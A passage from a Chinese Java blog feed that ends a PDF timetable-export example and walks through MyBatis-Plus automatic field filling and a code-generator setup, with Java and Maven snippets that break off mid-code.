weekLessons2.add(twoPm);<br>        weekLessons2.add(threePm);<br><br>        <span class="hljs-type">SchoolTimeTable</span> <span class="hljs-variable">amData</span> <span class="hljs-operator">=</span> SchoolTimeTable.builder().period(<span class="hljs-string">&quot;上午&quot;</span>).weekLessons(weekLessons1).lessonsSize(weekLessons1.size()).build();<br>        <span class="hljs-type">SchoolTimeTable</span> <span class="hljs-variable">pmData</span> <span class="hljs-operator">=</span> SchoolTimeTable.builder().period(<span class="hljs-string">&quot;下午&quot;</span>).weekLessons(weekLessons2).lessonsSize(weekLessons2.size()).build();<br><br>        List&lt;SchoolTimeTable&gt; schoolTimeTables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(Collections.singletonList(amData));<br>        schoolTimeTables.add(pmData);<br><br>        HashMap&lt;String, Object&gt; dataMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        dataMap.put(<span class="hljs-string">&quot;schoolTimetable&quot;</span>,schoolTimeTables);<br><br>        <span class="hljs-comment">// 创建数据</span><br>        <span class="hljs-type">DefaultCategoryDataset</span> <span class="hljs-variable">dataset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultCategoryDataset</span>();<br>        dataset.addValue(<span class="hljs-number">306</span>, <span class="hljs-string">&quot;女&quot;</span>, <span class="hljs-string">&quot;高一&quot;</span>);<br>        dataset.addValue(<span class="hljs-number">295</span>, <span class="hljs-string">&quot;女&quot;</span>, <span class="hljs-string">&quot;高二&quot;</span>);<br>        dataset.addValue(<span class="hljs-number">285</span>, <span class="hljs-string">&quot;女&quot;</span>, <span class="hljs-string">&quot;高三&quot;</span>);<br>        dataset.addValue(<span class="hljs-number">282</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;高一&quot;</span>);<br>        dataset.addValue(<span class="hljs-number">301</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;高二&quot;</span>);<br>        dataset.addValue(<span class="hljs-number">296</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;高三&quot;</span>);<br>        <span class="hljs-comment">// 获取生成的图表</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">recruitStudentImg</span> <span class="hljs-operator">=</span> ImgBase64Util.genBase64ImageByChart(<span class="hljs-string">&quot;招生人数统计&quot;</span>, <span class="hljs-string">&quot;年份&quot;</span>, <span class="hljs-string">&quot;人数&quot;</span>, dataset, <span class="hljs-string">&quot;recruit_student.jpg&quot;</span>);<br>        dataMap.put(<span class="hljs-string">&quot;recruitStudentImg&quot;</span>,recruitStudentImg);<br><br>        baos = PdfTemplateUtil.createPdfByItext(dataMap, <span class="hljs-string">&quot;cover.ftl&quot;</span>);;<br>        <span class="hljs-comment">// 设置响应消息头，告诉浏览器当前响应是一个下载文件</span><br>        response.setContentType( <span class="hljs-string">&quot;application/x-msdownload&quot;</span>);<br>        <span class="hljs-comment">// 告诉浏览器，当前响应数据要求用户干预保存到文件中，以及文件名是什么 如果文件名有中文，必须URL编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> URLEncoder.encode(<span class="hljs-string">&quot;光明中学课表.pdf&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        response.setHeader( <span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + fileName);<br>        out = response.getOutputStream();<br>        baos.writeTo(out);<br>        baos.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;导出失败：&quot;</span> + e.getMessage());<br>    &#125; <span class="hljs-keyword">finally</span>&#123;<br>        <span class="hljs-keyword">if</span>(baos != <span class="hljs-literal">null</span>)&#123;<br>            baos.close();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(out != <span class="hljs-literal">null</span>)&#123;<br>            out.close();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
      <tag>springboot</tag>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mybatis Plus提升CRUD效率（二）</title>
    <link href="/2023/07/09/Mybatis%20Plus%E6%8F%90%E5%8D%87CRUD%E6%95%88%E7%8E%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2023/07/09/Mybatis%20Plus%E6%8F%90%E5%8D%87CRUD%E6%95%88%E7%8E%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="一、MP-自动填充"><a href="#一、MP-自动填充" class="headerlink" title="一、MP 自动填充"></a>一、MP 自动填充</h1><blockquote><p>参考:  <a href="https://baomidou.com/pages/4c6bcf/">自动填充功能 | MyBatis-Plus (baomidou.com)</a></p></blockquote><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>对于项目中的各个实体都具备公共字段，过去我们都是分别维护，如今可通过自动填充让业务实体只关注自身业务字段，无需处理公共字段的填充，由此可带来以下优势：</p><ul><li>统一实体对象管理，简化实体结构</li><li>由MP统一处理，便捷的进行CRUD、主键生成及逻辑删除等操作</li></ul><p>首先定义一个基础实体类BaseBO，里面包含主键、业务主键、创建人、创建时间等公共字段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseDO</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 主键ID</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;主键ID&quot;)</span><br>    <span class="hljs-meta">@TableId(value = &quot;id&quot;, type = IdType.AUTO)</span><br>    <span class="hljs-keyword">private</span> Long id;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 业务主键</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;业务主键&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;bid&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-keyword">private</span> Long bid;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建时间</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;创建时间&quot;)</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;create_at&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-keyword">private</span> Date createAt;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建人</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;创建人&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;create_by&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-keyword">private</span> String createBy;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新时间</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;更新时间&quot;)</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;update_at&quot;, fill = FieldFill.INSERT_UPDATE)</span><br>    <span class="hljs-keyword">private</span> Date updateAt;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新人</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;更新人&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;update_by&quot;, fill = FieldFill.INSERT_UPDATE)</span><br>    <span class="hljs-keyword">private</span> String updateBy;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 逻辑删除 0-未删除 1-已删除</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;逻辑删除&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;deleted&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-meta">@TableLogic(value = &quot;0&quot;, delval = &quot;1&quot;)</span><br>    <span class="hljs-keyword">private</span> Integer deleted;<br>  <br>    <span class="hljs-meta">@ApiModelProperty(hidden = true)</span><br>    <span class="hljs-meta">@TableField(exist = false)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对其中的每个字段我们需要实现对应的自动填充功能，如创建人从请求头填入的<code>ThreadLocal</code>获取填充、创建时间及更新时间生成、业务主键生成等，而利用MP我们可以轻松做到这一点。</p><h2 id="填充原理"><a href="#填充原理" class="headerlink" title="填充原理"></a>填充原理</h2><ul><li>实现元对象处理器接口：com.baomidou.mybatisplus.core.handlers.MetaObjectHandler</li></ul><h2 id="业务实践"><a href="#业务实践" class="headerlink" title="业务实践"></a>业务实践</h2><ul><li>注解填充字段 <code>@TableField(.. fill = FieldFill.INSERT)</code></li></ul><p>其中枚举 <code>FieldFill</code> 可选值如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">FieldFill</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 默认不处理</span><br><span class="hljs-comment">     */</span><br>    DEFAULT,<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 插入填充字段</span><br><span class="hljs-comment">     */</span><br>    INSERT,<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新填充字段</span><br><span class="hljs-comment">     */</span><br>    UPDATE,<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 插入和更新填充字段</span><br><span class="hljs-comment">     */</span><br>    INSERT_UPDATE<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>自定义实现类 MyMetaObjectHandler</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBaseMetaObjectHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MetaObjectHandler</span> &#123;<br><br>    <span class="hljs-meta">@SneakyThrows</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertFill</span><span class="hljs-params">(MetaObject metaObject)</span> &#123;<br>        <span class="hljs-comment">// 设置基础属性为空则自动填充</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bid</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;bid&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(bid))&#123;<br>            setFieldValByName(<span class="hljs-string">&quot;bid&quot;</span>,SequenceUtils.nextId(),metaObject);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">createAt</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;createAt&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(createAt))&#123;<br>            setFieldValByName(<span class="hljs-string">&quot;createAt&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),metaObject);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">createBy</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;createBy&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(createBy))&#123;<br>            setFieldValByName(<span class="hljs-string">&quot;createBy&quot;</span>,UserThreadLocal.getUserIdWithName(),metaObject);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">updateAt</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;updateAt&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(updateAt))&#123;<br>            metaObject.setValue(<span class="hljs-string">&quot;updateAt&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());;<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">updateBy</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;updateBy&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(updateAt))&#123;<br>            metaObject.setValue(<span class="hljs-string">&quot;updateBy&quot;</span>, UserThreadLocal.getUserIdWithName());;<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">deleted</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;deleted&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(deleted))&#123;<br>            setFieldValByName(<span class="hljs-string">&quot;deleted&quot;</span>,<span class="hljs-number">0</span>,metaObject);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;version&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(version))&#123;<br>            version = SequenceUtils.nextId();<br>            setFieldValByName(<span class="hljs-string">&quot;version&quot;</span>,version,metaObject);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFill</span><span class="hljs-params">(MetaObject metaObject)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;公共字段自动填充【update】&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">updateAt</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;updateAt&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(updateAt))&#123;<br>            metaObject.setValue(<span class="hljs-string">&quot;updateAt&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());;<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">updateBy</span> <span class="hljs-operator">=</span> getFieldValByName(<span class="hljs-string">&quot;updateBy&quot;</span>, metaObject);<br>        <span class="hljs-keyword">if</span>(ObjectUtils.isEmpty(updateAt))&#123;<br>            metaObject.setValue(<span class="hljs-string">&quot;updateBy&quot;</span>, UserThreadLocal.getUserIdWithName());;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，我们再使用业务实体继承BaseDO，使业务实体只需关注自身业务字段，无需处理公共字段，简单示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 餐品信息维度表</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> DunkingCurry</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@TableName</span> dim_busi_order_info</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@EqualsAndHashCode(callSuper = true)</span><br><span class="hljs-meta">@TableName(value =&quot;dim_busi_order_info&quot;)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DimBusiOrderInfo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDO</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 餐品种类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@TableField(value = &quot;meal_category&quot;)</span><br>    <span class="hljs-keyword">private</span> String mealCategory;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 餐品中文名</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@TableField(value = &quot;meal_name_cn&quot;)</span><br>    <span class="hljs-keyword">private</span> String mealNameCn;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 餐品英文名</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@TableField(value = &quot;meal_name_en&quot;)</span><br>    <span class="hljs-keyword">private</span> String mealNameEn;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 餐品单价</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@TableField(value = &quot;meal_unit_price&quot;)</span><br>    <span class="hljs-keyword">private</span> BigDecimal mealUnitPrice;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二、MP-代码生成器"><a href="#二、MP-代码生成器" class="headerlink" title="二、MP 代码生成器"></a>二、MP 代码生成器</h1><blockquote><p>适用版本：mybatis-plus-generator 3.5.1 及其以上版本</p></blockquote><h2 id="配置准备"><a href="#配置准备" class="headerlink" title="配置准备"></a>配置准备</h2><ul><li>基础Entity类 BaseDO</li><li>自动填充实现类 MyMetaObjectHandler</li><li>以下依赖引入</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Mybatis-plus-join 依赖  --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.yulichang<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-join-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Mybatis-plus generator--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- free maker 模板--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意，此处使用了 Mybatis-plus-join 做联表增强，若只使用MP功能可不引入，对应在下述配置中修改对应BaseMapper、BaseService即可</p></blockquote><h2 id="自定义代码生成器实现"><a href="#自定义代码生成器实现" class="headerlink" title="自定义代码生成器实现"></a>自定义代码生成器实现</h2><p>具体代码实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Mybatis Plus 代码生成器</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : DunkingCurry</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@createTime</span> : 15/7/2023 下午12:42</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MpFastAutoGenerator</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 执行 run</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-comment">// 需要生成代码的数据表清单, 英文逗号,分隔</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">tableNames</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test_table_template&quot;</span>;<br><br>        <span class="hljs-comment">// 数据源配置</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/devdb?serverTimezone=UTC&amp;characterEncoding=utf8&amp;useUnicode=true&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">projectPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>);<br><br>        FastAutoGenerator<br>                <span class="hljs-comment">// 数据源配置</span><br>                .create(url, username, password)<br>                <span class="hljs-comment">// 全局配置</span><br>                .globalConfig(builder -&gt; builder.fileOverride()<br>                        .outputDir(projectPath + <span class="hljs-string">&quot;/src/main/java&quot;</span>)<br>                        .disableOpenDir()<br>                        .author(<span class="hljs-string">&quot;DunkingCurry&quot;</span>)<br>                        .enableSwagger()<br>                        .dateType(DateType.ONLY_DATE)<br>                        .commentDate(<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>))<br>                <span class="hljs-comment">// 包配置</span><br>                .packageConfig(builder -&gt; builder.parent(<span class="hljs-string">&quot;com.learn.sc.springbootdemo&quot;</span>)<br>                        .entity(<span class="hljs-string">&quot;dao.entity&quot;</span>)<br>                        .service(<span class="hljs-string">&quot;service&quot;</span>)<br>                        .serviceImpl(<span class="hljs-string">&quot;service.impl&quot;</span>)<br>                        .mapper(<span class="hljs-string">&quot;dao.mapper&quot;</span>)<br>                        .controller(<span class="hljs-string">&quot;web.controller&quot;</span>)<br>                        <span class="hljs-comment">// 自定义Mapper XML位置至resource目录下</span><br>                        .pathInfo(Collections.singletonMap(OutputFile.mapperXml, projectPath + <span class="hljs-string">&quot;/src/main/resources/mapper/default&quot;</span>)))<br>                <span class="hljs-comment">// 策略配置</span><br>                .strategyConfig(builder -&gt; builder<br>                        <span class="hljs-comment">// -- 生成表清单 --</span><br>                        .addInclude(tableNames.trim().split(<span class="hljs-string">&quot;,&quot;</span>))<br>                        <span class="hljs-comment">// -- Entity 策略配置 --</span><br>                        .entityBuilder()<br>                        <span class="hljs-comment">// 设置entity父类</span><br>                        .superClass(BaseDO.class)<br>                        <span class="hljs-comment">// 设置父类公共字段</span><br>                        .addSuperEntityColumns(<span 